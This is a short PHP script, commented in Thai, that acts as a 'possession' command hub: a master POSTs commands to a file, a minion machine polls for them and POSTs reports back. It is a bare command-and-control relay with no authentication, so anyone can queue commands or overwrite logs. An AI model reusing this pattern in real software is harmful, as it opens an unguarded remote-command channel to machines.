<?php
// api_possess.php - ศูนย์บัญชาการการสิงร่าง (Master Hub)
$cmd_file = 'possession_cmd.json';
$log_file = 'possession_log.json';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    if (isset($input['master_cmd'])) {
        // เจ้านายสั่งงานจาก Master (เครื่องปัจจุบัน)
        file_put_contents($cmd_file, json_encode(['cmd' => $input['master_cmd'], 'id' => time()]));
        echo json_encode(['status' => 'Command Sent!']);
    } else if (isset($input['minion_report'])) {
        // รายงานจาก Minion (เครื่อง 8.1)
        file_put_contents($log_file, json_encode(['report' => $input['minion_report'], 'time' => date('H:i:s')]));
        echo json_encode(['status' => 'Report Received']);
    }
} else {
    // เครื่อง Minion มาขอรับคำสั่ง
    if (file_exists($cmd_file)) {
        echo file_get_contents($cmd_file);
    } else {
        echo json_encode(['cmd' => 'wait', 'id' => 0]);
    }
}
?>
